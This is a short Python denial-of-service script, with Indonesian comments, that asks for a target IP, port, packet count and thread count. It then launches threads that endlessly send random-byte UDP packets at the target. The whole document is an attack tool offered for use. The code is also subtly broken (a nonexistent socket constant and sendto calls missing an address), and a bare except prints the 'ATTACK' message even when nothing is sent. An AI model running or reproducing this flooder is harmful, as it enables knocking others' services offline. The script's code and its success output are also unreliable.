#Sc By Will 

import socket

import random

import threading

import os,sys

print("Welcome To Simple Dos")

ip_wibu = str(input("Ip Target : "))

port_wibu = int(input("Port Target : "))

paket_wibu = int(input("Paket Dari Ari : "))

threads_wibu = int(input("Thread Dari Ari : "))

os.system("clear")

def wibu():

    asu = random._urandom(1125)#ubah angka urandom= damage

    while True:

        try:

            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)

            s.connect((ip_wibu,port_wibu))

            s.sendto(asu)

            for x in range(paket_wibu):

                s.sendto(asu)

            print("[#] ARI ATTACK!!!")

        except:

            print("[#] ARI ATTACK!!!")

for y in range(threads_wibu):

    th = threading.Thread(target=wibu)

    th.start()
